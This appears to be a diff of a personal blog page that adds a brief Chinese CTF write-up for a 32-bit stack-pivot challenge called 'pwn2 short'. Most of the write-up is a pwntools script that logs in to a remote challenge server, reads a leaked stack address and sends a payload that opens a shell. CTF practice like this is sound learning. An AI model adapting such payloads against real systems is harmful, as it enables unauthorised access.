@@ -6,7 +6,7 @@
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-	<title>Archives [ your blog title ]</title>
+	<title> [ your blog title ]</title>
 	
 	
 	<!-- stylesheets list from _config.yml -->
@@ -105,40 +105,73 @@
 			<div id="content-inner">
 
 				
+<div id="details">
+	
+	<article id="details-post">
+		<div id=details-post-item>
+			<h1></h1>
+			<h1 id="pwn2-short"><a href="#pwn2-short" class="headerlink" title="pwn2 short"></a>pwn2 short</h1><p>很简单的32位栈迁移，还留了个后门</p>
+<p>这里获得栈地址</p>
+<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241029170723988.png" alt="image-20241029170723988"></p>
+<p>把bin/sh的地址放返回地址后面就ok</p>
+<pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744)
+#p=process(&quot;./short&quot;)
+context.log_level=&quot;debug&quot;
+
+p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;)
+p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;)
+p.recvuntil(&#39;0x&#39;)
+stack=int(p.recv(8),16)
+print(hex(stack))
+pop_edi=0x0804884a
+pop_ebx=0x08048411
+gift=0x080485E6
+leave=0x08048674
+binsh=0x0804A038 
+payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave)
 
 
+#gdb.attach(p)
+sleep(1)
+p.sendlineafter(&quot;msg:&quot;,payload)
 
-<div id="archive">
+p.interactive()
+</code></pre>
 
-  <h1 class="archive-big">Archives</h1>
+		</div>
 
-  
+		<!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC80NjIyNC8yMjczNQ==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
 
-  <aside>
-    <h2 class="archive-category">Categories</h2>
-    
-    <p>None.</p>
-    
-  </aside>
-  <br>
+       if (typeof LivereTower === 'function') { return; }
 
-  <aside>
-    <h2 class="archive-tag">Tags</h2>
-    
-    <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-NewSar/" rel="tag">ctf-NewSar</a></li></ul>
-    
-  </aside>
-  <br>
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
 
-  <aside>
-    <h2 class="archive-archive">Archives</h2>
-    
-    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
-    
-  </aside>
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+		
+	</article>
+
+	<div id="toc">
+		
+	</div>
 
 </div>
 
+<!-- <div id="paginator"> -->
+<!-- 	 -->
+<!-- </div> -->
 
 
 			</div>
